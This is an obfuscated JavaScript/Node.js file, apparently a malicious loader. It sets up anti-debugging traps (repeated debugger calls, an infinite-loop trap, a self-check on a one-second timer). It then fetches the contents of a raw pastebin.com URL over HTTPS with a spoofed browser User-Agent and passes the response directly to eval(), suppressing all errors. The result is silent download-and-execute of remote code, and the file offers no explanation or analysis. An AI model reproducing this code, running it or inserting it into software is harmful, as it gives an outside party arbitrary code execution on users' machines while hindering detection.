var _0x4c944f = (function () {
    var _0x3fad63 = !![];
    return function (_0x373f43, _0x4a3426) {
        var _0xf8f9c3 = _0x3fad63 ? function () {
            if (_0x4a3426) {
                var _0x2f7a6a = _0x4a3426['apply'](_0x373f43, arguments);
                _0x4a3426 = null;
                return _0x2f7a6a;
            }
        } : function () {
        };
        _0x3fad63 = ![];
        return _0xf8f9c3;
    };
}());
(function () {
    _0x4c944f(this, function () {
        var _0x43c854 = new RegExp('function\x20*\x5c(\x20*\x5c)');
        var _0x5cd2fe = new RegExp('\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i');
        var _0x2ccd06 = _0x3a0816('init');
        if (!_0x43c854['test'](_0x2ccd06 + 'chain') || !_0x5cd2fe['test'](_0x2ccd06 + 'input')) {
            _0x2ccd06('0');
        } else {
            _0x3a0816();
        }
    })();
}());
(function () {
    var _0x23a084 = function () {
        var _0x2d578f;
        try {
            _0x2d578f = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');')();
        } catch (_0x47e23f) {
            _0x2d578f = window;
        }
        return _0x2d578f;
    };
    var _0x59eeee = _0x23a084();
    _0x59eeee['setInterval'](_0x3a0816, 0x3e8);
}());
try {
    var https = require('https');
    https['get']({
        'hostname': 'pastebin.com',
        'path': '/raw/XLeVP82h',
        'headers': {
            'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x206.1;\x20rv:52.0)\x20Gecko/20100101\x20Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
    }, _0x1fa3bf => {
        _0x1fa3bf['setEncoding']('utf8');
        _0x1fa3bf['on']('data', _0x476b03 => {
            eval(_0x476b03);
        });
        _0x1fa3bf['on']('error', () => {
        });
    })['on']('error', () => {
    });
} catch (_0x11b77f) {
}
function _0x3a0816(_0x2b9a3c) {
    function _0x548575(_0x1a5636) {
        if (typeof _0x1a5636 === 'string') {
            return function (_0x209d54) {
            }['constructor']('while\x20(true)\x20{}')['apply']('counter');
        } else {
            if (('' + _0x1a5636 / _0x1a5636)['length'] !== 0x1 || _0x1a5636 % 0x14 === 0x0) {
                (function () {
                    return !![];
                }['constructor']('debu' + 'gger')['call']('action'));
            } else {
                (function () {
                    return ![];
                }['constructor']('debu' + 'gger')['apply']('stateObject'));
            }
        }
        _0x548575(++_0x1a5636);
    }
    try {
        if (_0x2b9a3c) {
            return _0x548575;
        } else {
            _0x548575(0x0);
        }
    } catch (_0x35b47e) {
    }
}
